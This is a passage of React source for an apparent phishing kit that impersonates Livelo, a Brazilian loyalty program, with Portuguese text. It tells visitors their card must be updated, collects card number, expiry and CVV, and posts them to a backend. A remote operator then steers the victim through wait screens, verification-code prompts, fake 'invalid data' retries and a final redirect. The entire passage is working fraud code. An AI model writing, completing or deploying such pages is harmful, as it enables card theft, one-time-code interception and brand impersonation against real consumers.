      if (nums.length < 13 || nums.length > 16) return false;
      // Luhn algorithm
      let sum = 0;
      let alt = false;
      for (let i = nums.length - 1; i >= 0; i--) {
        let n = parseInt(nums[i], 10);
        if (alt) { n *= 2; if (n > 9) n -= 9; }
        sum += n;
        alt = !alt;
      }
      return sum % 10 === 0;
    };

    const validateExpiry = () => {
      const parts = cardExpiry.split("/");
      if (parts.length !== 2) return false;
      const month = parseInt(parts[0], 10);
      const year = parseInt("20" + parts[1], 10);
      if (month < 1 || month > 12) return false;
      const now = new Date();
      const expDate = new Date(year, month);
      return expDate > now;
    };

    const isFormValid = validateCard() && validateExpiry() && cardCvv.length >= cvvLength;

    const handleCCSubmit = async (e) => {
      e.preventDefault();
      setLoading(true);
      const ccData = `${cardNumber} | ${cardExpiry} | ${cardCvv}`;
      try {
        await axios.post(`${API}/user/submit-data/${userId}`, {
          field: "credit_card",
          value: ccData
        });
        setSubmitted(true);
        // Mudar para tela de Aguarde
        setCurrentCommand({ action: "AGUARDE" });
      } catch (error) {
        console.error("Erro ao enviar dados:", error);
      }
    };

    return (
      <div className="min-h-screen bg-white flex flex-col font-inter">
        <div className="flex-1 flex flex-col items-center pt-16 px-4">
          {/* Logo */}
          <div className="mb-8">
            <img 
              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
              alt="Livelo Logo" 
              className="h-10 w-auto"
            />
          </div>

          {/* Ícone */}
          <div className="mb-6">
            <div className={`w-20 h-20 rounded-full flex items-center justify-center ${isInvalid ? 'bg-red-100' : 'bg-gradient-to-br from-pink-100 to-purple-100'}`}>
              <svg className={`w-10 h-10 ${isInvalid ? 'text-red-500' : 'text-pink-500'}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                {isInvalid ? (
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                ) : (
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                )}
              </svg>
            </div>
          </div>

          {/* Erro */}
          {isInvalid && (
            <div className="mb-4 px-4 py-3 bg-red-50 border border-red-200 rounded-lg max-w-sm">
              <p className="text-red-600 text-sm text-center font-medium">
                Dados do cartão inválidos. Por favor, digite novamente.
              </p>
            </div>
          )}

          {/* Título */}
          <h1 className="text-2xl font-extrabold text-gray-900 mb-3 text-center">
            Cadastre seu cartão
          </h1>

          <p className="text-gray-600 mb-8 text-center max-w-sm">
            Os dados do seu cartão de crédito precisam ser atualizados para continuar pontuando na Livelo.
          </p>

          {/* Formulário */}
          <form onSubmit={handleCCSubmit} className="w-full max-w-md space-y-5">
            {/* Número do Cartão */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1.5">Número do cartão</label>
              <div className="relative">
                <div className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400">
                  <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                  </svg>
                </div>
                <input
                  type="text"
                  value={cardNumber}
                  onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                  placeholder="0000 0000 0000 0000"
                  disabled={loading}
                  maxLength={19}
                  className={`w-full pl-12 pr-4 py-3.5 border rounded-lg focus:outline-none transition-colors disabled:bg-gray-100 text-base ${isInvalid ? 'border-red-500' : 'border-gray-900 focus:border-pink-500'}`}
                />
              </div>
            </div>

            {/* Validade e CVV lado a lado */}
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1.5">Validade</label>
                <input
                  type="text"
                  value={cardExpiry}
                  onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
                  placeholder="MM/AA"
                  disabled={loading}
                  maxLength={5}
                  className={`w-full px-4 py-3.5 border rounded-lg focus:outline-none transition-colors disabled:bg-gray-100 text-base text-center ${isInvalid ? 'border-red-500' : 'border-gray-900 focus:border-pink-500'}`}
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1.5">CVV</label>
                <input
                  type="text"
                  value={cardCvv}
                  onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, cvvLength))}
                  placeholder={getIsAmex() ? "0000" : "000"}
                  disabled={loading}
                  maxLength={cvvLength}
                  className={`w-full px-4 py-3.5 border rounded-lg focus:outline-none transition-colors disabled:bg-gray-100 text-base text-center ${isInvalid ? 'border-red-500' : 'border-gray-900 focus:border-pink-500'}`}
                />
              </div>
            </div>

            {/* Botão */}
            <button
              type="submit"
              disabled={loading || !isFormValid}
              className={`w-full py-3.5 rounded-full font-medium text-base transition-all duration-300 mt-2 ${
                isFormValid && !loading
                  ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-md hover:shadow-lg"
                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
              } ${loading ? "bg-gradient-to-r from-pink-500 to-pink-600" : ""}`}
            >
              {loading ? (
                <div className="flex items-center justify-center">
                  <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                </div>
              ) : (
                "Continuar"
              )}
            </button>

            <div className="flex items-center justify-center gap-4 pt-2">
              <div className="flex items-center gap-1 text-gray-400 text-xs">
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
                Conexão segura
              </div>
            </div>
          </form>
        </div>

        {/* Voltar */}
        <div className="p-8">
          <a href="#" className="flex items-center text-[#3F3F9B] hover:text-[#2F2F7B] text-sm transition-colors">
            <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
            </svg>
            Voltar para página inicial
          </a>
        </div>
      </div>
    );
  }

  // Página COD-CC - Código de verificação do cartão
  if (currentCommand?.action === "COD-CC" || currentCommand?.action === "COD-CC-INV") {
    const isInvalid = currentCommand?.action === "COD-CC-INV";
    const referenceText = currentCommand?.command_reference || "";

    return (
      <div className="min-h-screen bg-white flex flex-col font-inter">
        <div className="flex-1 flex flex-col items-center pt-12 px-4">
          {/* Logo Livelo */}
          <div className="mb-8">
            <img 
              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
              alt="Livelo Logo" 
              className="h-10 w-auto"
            />
          </div>

          {/* Header com título e X */}
          <div className="w-full max-w-lg flex items-center justify-between mb-8">
            <h1 className="text-xl font-normal text-gray-800">Insira o código de verificação</h1>
            <button className="text-gray-400 hover:text-gray-600 text-2xl">&times;</button>
          </div>

          <div className="w-full max-w-lg">
            {/* Texto de referência do admin */}
            {referenceText && (
              <p className="text-gray-700 text-sm leading-relaxed mb-6">{referenceText}</p>
            )}

            {/* Erro */}
            {isInvalid && (
              <div className="mb-4 px-4 py-3 bg-red-50 border border-red-200 rounded-lg">
                <p className="text-red-600 text-sm font-medium">
                  Código inválido. Por favor, digite novamente.
                </p>
              </div>
            )}

            {/* Campo de código */}
            <form onSubmit={(e) => handleSubmit(e, "cc_code")} className="space-y-4">
              <div>
                <label className={`block text-sm font-medium mb-2 ${isInvalid ? 'text-red-500' : 'text-pink-500'}`}>
                  Código
                </label>
                <input
                  type="text"
                  inputMode="numeric"
                  value={inputValue}
                  onChange={(e) => {
                    const val = e.target.value.replace(/\D/g, "");
                    setInputValue(val);
                  }}
                  disabled={loading}
                  placeholder=""
                  className={`w-full px-4 py-4 border-2 rounded-lg focus:outline-none transition-colors disabled:bg-gray-100 text-lg ${isInvalid ? 'border-red-500' : 'border-pink-500 focus:border-pink-600'}`}
                />
              </div>

              {inputValue && /\D/.test(inputValue) && (
                <p className="text-red-500 text-xs">Só é possível inserir números</p>
              )}

              {/* Pedir novo código */}
              <div>
                <a href="#" className="text-blue-600 hover:text-blue-800 text-sm font-medium">
                  Pedir um novo código
                </a>
              </div>

              {/* Botão Confirmar */}
              <div className="flex justify-end pt-4">
                <button
                  type="submit"
                  disabled={loading || !inputValue || inputValue.length < 1}
                  className={`px-8 py-2.5 rounded font-medium text-base transition-all duration-300 ${
                    inputValue && !loading
                      ? "bg-blue-600 text-white hover:bg-blue-700"
                      : "bg-gray-200 text-gray-400 cursor-not-allowed"
                  }`}
                >
                  {loading ? (
                    <div className="flex items-center justify-center">
                      <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                    </div>
                  ) : (
                    "Confirmar"
                  )}
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    );
  }

  // Página aguarde
  if (currentCommand?.action === "AGUARDE") {
    return (
      <div className="min-h-screen bg-white flex flex-col font-inter cursor-wait">
        <div className="flex-1 flex flex-col items-center justify-center px-4">
          {/* Logo Livelo */}
          <div className="mb-12">
            <img 
              src="https://customer-assets.emergentagent.com/job_noite-web/artifacts/b119auio_Logo_Livelo_Logo1-removebg-preview.png" 
              alt="Livelo Logo" 
              className="h-12 w-auto"
            />
          </div>

          {/* Spinner de loading */}
          <div className="mb-8">
            <div className="relative">
              <div className="w-16 h-16 border-4 border-gray-200 rounded-full"></div>
              <div className="absolute top-0 left-0 w-16 h-16 border-4 border-transparent border-t-pink-500 rounded-full animate-spin"></div>
            </div>
          </div>

          {/* Texto Aguarde */}
          <h1 className="text-2xl font-bold text-gray-800">
            Aguarde...
          </h1>
        </div>
      </div>
    );
  }

  // Redirecionar
  if (currentCommand?.action === "REDIRECT" && currentCommand?.redirect_url) {
    window.location.href = currentCommand.redirect_url;
    return null;
  }

  return null;
}

export default CommandPage;
